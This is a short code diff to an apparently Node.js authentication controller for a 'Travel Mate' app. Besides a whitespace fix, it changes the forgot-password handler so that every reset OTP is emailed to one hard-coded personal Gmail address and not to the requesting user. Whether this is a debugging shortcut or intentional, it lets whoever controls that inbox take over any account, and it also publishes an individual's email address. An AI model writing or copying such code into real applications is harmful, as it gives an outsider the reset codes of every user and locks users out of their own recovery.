@@ -131,7 +131,7 @@ const login = async (req, res) => {
 };
 
 // FORGOT PASSWORD - Generate OTP
-const sendEmail = require("../utils/sendEmail"); 
+const sendEmail = require("../utils/sendEmail");
 
 const forgotPassword = async (req, res) => {
   const { email } = req.body;
@@ -154,7 +154,7 @@ const forgotPassword = async (req, res) => {
   // Send real email
   try {
     await sendEmail({
-      to: email,
+      to: "tinasitaula835@gmail.com",
       subject: "Travel Mate - Password Reset OTP",
       text: `Your one-time password (OTP) is: ${otp}\n\nThis code expires in 10 minutes.\n\nIf you did not request this reset, please ignore this email.`,
       html: `
